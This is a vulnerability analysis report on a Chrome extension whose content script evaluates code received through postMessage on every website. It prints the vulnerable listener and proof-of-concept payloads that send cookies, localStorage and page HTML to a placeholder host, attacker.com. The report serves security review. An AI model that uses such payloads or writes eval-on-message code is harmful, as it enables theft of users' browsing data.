# CoCo Analysis: fkoanpnbdofolodbnfgiigppacpkfmgb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → eval_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fkoanpnbdofolodbnfgiigppacpkfmgb/opgen_generated_files/cs_0.js
Line 526: window.addEventListener("message", function(e)
Line 530: if(e.data && e.data.cmd == 'invoke') {
Line 531: eval('('+e.data.code+')');

**Code:**

```javascript
// Content script - Entry point (cs_0.js, line 526-537)
window.addEventListener("message", function(e)
{
	// console.log('收到消息：', e.data);

	if(e.data && e.data.cmd == 'invoke') {
		eval('('+e.data.code+')');  // ← attacker-controlled via e.data.code
	}

	else if(e.data && e.data.cmd == 'message') {
		tip(e.data.data);
	}
}, false);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage - Content script listens for message events on all URLs (<all_urls>)

**Attack:**

```javascript
// From ANY webpage (extension runs on <all_urls>)
window.postMessage({
  cmd: 'invoke',
  code: 'alert(document.cookie)'
}, '*');

// Steal sensitive data:
window.postMessage({
  cmd: 'invoke',
  code: 'fetch("https://attacker.com/exfil", {method: "POST", body: JSON.stringify({cookies: document.cookie, localStorage: localStorage})})'
}, '*');

// Execute arbitrary malicious code:
window.postMessage({
  cmd: 'invoke',
  code: 'document.body.innerHTML = "<h1>Pwned</h1>"; fetch("https://attacker.com/steal", {method: "POST", body: document.documentElement.outerHTML})'
}, '*');
```

**Impact:** Complete arbitrary code execution via eval() on ALL websites. Since the extension runs on `<all_urls>`, any malicious website can execute arbitrary JavaScript code in the extension's content script context, steal cookies, manipulate the DOM, and exfiltrate sensitive data from any webpage the user visits.
